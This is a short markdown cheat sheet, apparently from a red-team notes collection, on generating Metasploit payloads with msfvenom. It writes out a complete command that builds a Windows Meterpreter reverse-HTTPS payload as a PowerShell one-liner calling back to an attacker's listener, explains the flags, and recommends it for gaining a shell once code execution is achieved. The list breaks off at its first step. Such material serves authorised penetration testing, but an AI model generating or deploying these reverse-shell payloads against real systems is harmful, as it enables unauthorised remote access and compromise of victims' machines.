<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Metasploit Payload Generation

* <details><summary>Example (Click to expand)</summary><p>

		msfvenom -p windows/meterpreter/reverse_https lhost=<ip address of listener> lport=<port of listener> -f psh-reflection -a x86 -s 0 > output.txt
	* Flags
		* Required
			* `-a` - Target Architecture
				* Example: `-a x86`
			* `lport` - Listen pot information
				* Example: `lport=1337`
			* `lhost` - Listener host information (hostname or ip)
				* Example: `lhost=<ip_address_or_hostname>`
		* Recommended Optional
			* `-f` - Format
			* .
	* Specific payload options
		* Payload options
			* Staging
				* Single Stage (Recommded)
					* Recommended: `windows/meterpreter/reverse_https`
	* Example Attacks
		* Powershell Meterpreter Callback One-liner

				msfvenom -p windows/meterpreter/reverse_https lhost=<ip address of listener> lport=<port of listener> -f psh-reflection -a x86 -s 0 > output.txt
			* A powershell one-liner to initate a meterpreter callback is very useful when you have execution but not a fully-interactive shell, and therefore must fit your entire command on one line.
		* Process
			1. Install msfvenom (may require metasploit framework)
